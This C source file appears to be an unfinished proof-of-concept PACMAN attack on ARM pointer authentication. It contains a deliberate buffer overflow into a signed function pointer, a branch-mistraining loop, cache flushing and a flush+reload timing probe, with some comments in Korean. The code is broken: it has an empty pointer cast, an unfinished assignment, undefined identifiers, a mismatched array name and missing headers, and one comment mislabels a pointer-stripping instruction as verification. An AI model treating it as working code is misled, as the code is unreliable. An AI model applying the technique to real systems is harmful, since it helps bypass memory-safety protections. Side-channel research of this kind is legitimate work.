#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <inttypes.h>
#include <ptrauth.h>
/*
    clang -O2 -o pacman pacman.c \
  -target aarch64-linux-gnu \
  -march=armv8.3-a \
  -mbranch-protection=pac-ret \
  -fptrauth-intrinsics
*/
typedef struct object{
    char buf[10];
    void (*fp)(void);
}object;   

void target(void) {
    puts("target(): entered");
}

volatile uint8_t temp= 0;

inline __attribute__((always_inline)) void vulnerable_func(char* str){
    object* obj = (object*)malloc(sizeof(object));
    
    __asm__ __volatile__("paciza %x0\n" :: "r"(obj->fp) : "memory"); // sign pointer

    memcpy(obj->buf,str,strlen(str)); // overwrite signed pointer : obj -> fp
    // mistrain branch
    if(strlen(str) < strlen(obj->buf)){ // R1
        __asm__ __volatile__("xpaci %x0\n" :: "r"(obj->fp) : "memory"); // verify pac
        temp ^= *(volatile uint8_t*)()  // load 
    }
}


inline __attribute__((always_inline)) void serialized_flush(void *ptr)
{
    asm volatile("dc civac, %0" :: "r"(ptr) : "memory"); // 라인 클린+인벌리드
    asm volatile("dsb ish" ::: "memory");                // 완료 보장(데이터 가시성)
    asm volatile("isb"); 
}

inline __attribute__((always_inline))uint64_t rdtsc(){
    uint64_t v;
    asm volatile("dsb ish");
    asm volatile("isb");
    asm volatile("mrs %0, cntvct_el0" : "=r"(v));
    asm volatile("isb");
    return v;
    
}

const char* safe_str = "0123456";
const char* malicious_str = "01234567891"; // 10바이트 dummy + malicious target

int main(void) {
    void (*raw_f)(void) = target;
    uintptr_t raw = (uintptr_t)raw_f;
    uint64_t timing[256];
    uint64_t t1,t2;

    const long pageSize = sysconf(_SC_PAGESIZE);
    void* probe = mmap(NULL, pageSize * 256, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1,0);
    if (probe == MAP_FAILED) { printf("Failed to allocate cache channel pages\n"); return EXIT_FAILURE; }
    

    memset(probe, 0x10, 256 * pageSize);
    

    // sign pointer
    void *signed_ptr = ptrauth_sign_unauthenticated((void*)raw_f,
                                                    ptrauth_key_function_pointer, 0);
 

    // authenticate
    void *stripped = ptrauth_strip(signed_ptr, ptrauth_key_function_pointer);
   // printf("stripped  = %p (0x%016" PRIxPTR ")\n", stripped, (uintptr_t)stripped);

    // 안전하게 간접 호출
    void (*fcall)(void) = (void(*)(void))stripped;
    //fcall();
    __asm__ __volatile__("blr %x0\n" :: "r"(fcall) : "memory"); 



    // flush 
    for(int i = 0; i < 256; i++) serialized_flush(probe + i * pageSize);

    // pacman gadget
    for(int i = 0; i < 20; i++){
        char * x= //  마지막에만 malicious str
        vulnerable_func(x);
    }

    // reload
    struct Node *head = rootNode;
    volatile uint8_t temp = 0;

    for(int i = 0 ; i < 256; i++){
        t1 = rdtsc();
        temp ^= *(volatile uint8_t *)(probe + i * pageSize);
        t2 = rdtsc();
        timings[i] = (t2-t1);
    }

    return 0;
}
